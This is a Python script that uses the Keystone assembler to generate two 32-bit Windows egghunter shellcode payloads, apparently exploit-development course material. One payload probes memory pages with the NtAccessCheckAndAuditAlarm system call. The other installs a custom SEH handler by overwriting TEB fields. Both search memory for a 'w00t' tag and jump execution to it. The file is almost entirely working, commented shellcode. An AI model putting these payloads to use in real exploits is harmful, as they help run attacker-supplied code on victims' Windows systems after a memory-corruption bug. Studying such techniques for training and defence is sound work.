import keystone

ntaccess = """
loop_inc_page:
    # Use the edx register as a memory page counter
    # Go to the last address in the memory page
    or dx, 0x0fff
loop_inc_one:
    # Increase the memory counter by one
    inc edx
loop_check:
    # Save the edx register which holds our memory address on the stack
    push edx
    # Clear the eax register
    xor eax, eax
    # Initialize the call to NtAccessCheckAndAuditAlarm
    mov ax, 0x1c6
    # Perform the system call
    int 0x2e
    # Check for access violation, 0xc0000005 (ACCESS_VIOLATION)
    cmp al, 05
    # Restore the edx register to check later for our egg
    pop edx
loop_check_valid:
    # If access violation encountered, go to next page
    je loop_inc_page
is_egg:
    # Load egg (w00t in this example) into the eax register
    mov eax, 0x74303077
    # Initializes pointer with current checked address
    mov edi, edx
    # Compare eax with doubleword at edi and set status flag
    scasd
    # No match, we will increase our memory counter by one
    jnz loop_inc_one
    # First part of the egg detected, check for the second part
    scasd
    # No match, we found just a location with half an egg
    jnz loop_inc_one
matched:
    # The edi register points to the first byte of our buffer, we can jump to it
    jmp edi
"""

seh = """
start:
    # Jump to a negative call to dynamically obtain egghunter position
    jmp get_seh_address
build_exception_record:
    # Pop the address of the exception_handler into ecx
    pop ecx
    # Mov signature into eax
    mov eax, 0x74303077
    # Push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
    push ecx
    # Push Next of the _EXCEPTION_REGISTRATION_RECORD structure
    push 0xffffffff
    # Null out ebx
    xor ebx, ebx
    # Overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
    mov dword ptr fs:[ebx], esp
    # Subtract 0x04 from the pointer to exception_handler
    sub ecx, 0x04
    # Add 0x04 to ebx
    add ebx, 0x04
    # Overwrite the StackBase in the TEB
    mov dword ptr fs:[ebx], ecx
is_egg:
    # Push 0x02
    push 0x02
    # pop the value into ecx which will act as a counter
    pop ecx
    # Mov memory address into edi
    mov edi, ebx
    # Check for our signature, if the page is invalid we trigger an exception and jump to our exception_handler function
    repe scasd
    # If we didn't find signature, increase ebx and repeat
    jnz loop_inc_one
    # We found our signature and will jump to it
    jmp edi
loop_inc_page:
    # If page is invalid the exception_handler will update eip to point here and we move to next page
    or bx, 0xfff
loop_inc_one:
    # Increase ebx by one byte
    inc ebx
    # Check for signature again
    jmp is_egg
get_seh_address:
    # Call to a higher address to avoid null bytes & push
    # Return to obtain egghunter position
    call build_exception_record
    # Push 0x0c onto the stack
    push 0x0c
    # Pop the value into ecx
    pop ecx
    # Mov into eax the pointer to the CONTEXT structure for our exception
    mov eax, [esp+ecx]
    # Mov 0xb8 into ecx which will act as an offset to the eip
    mov cl, 0xb8
    # Increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
    add dword ptr ds:[eax+ecx], 0x06
    # Save return value into eax
    pop eax
    # Increase esp to clean the stack for our call
    add esp, 0x10
    # Push return value back into the stack
    push eax
    # Null out eax to simulate ExceptionContinueExecution return
    xor eax, eax
    # Return
    ret
"""


def create_egghunter(asm_type):
    # Initialize engine in 32bit mode
    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
    if asm_type == "ntaccess":
        asm = ntaccess
    elif asm_type == "seh":
        asm = seh
    else:
        print("Invalid egghunter type")
        return None

    encoding, count = ks.asm(asm)
    print(f"Egghunter payload created ({len(encoding)} bytes)")
    return bytes(encoding)
